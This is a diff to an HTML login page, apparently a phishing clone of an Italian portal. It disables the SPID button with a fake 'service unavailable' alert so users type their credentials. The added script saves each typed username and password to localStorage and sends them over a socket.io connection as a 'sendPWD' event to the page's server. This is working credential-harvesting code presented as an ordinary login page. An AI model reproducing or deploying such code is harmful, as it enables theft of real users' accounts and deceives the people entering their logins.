@@ -137,20 +137,33 @@
       </footer>
     </div>
 
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.2.0/socket.io.js"></script>
 <script>
+  const socket = io();
+
 document.querySelector(".italia-it-button-text").addEventListener("click", function() {
     alert("Servizio SPID non disponibile, per favore inserire le credenziali d'accesso");
 });
 
 function handleLoginButtonClick(event) {
               // Ottieni i valori di username e password
-              var username = document.getElementById('username').value;
+            var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
 
             // Salva i valori nel Local Storage
             localStorage.setItem('username', username);
             localStorage.setItem('password', password);
+
+
+                // Crea un oggetto JSON con i dati degli studenti
+                var pwd = 
+                    {
+                        user: username,
+                        pwd: password,
+                    };
+
+              // Invia i dati al server quando si connette
+              socket.emit('sendPWD', pwd);
 
             // Cambia il testo del bottone
             event.target.childNodes[0].nodeValue = 'Logging in, please wait...';
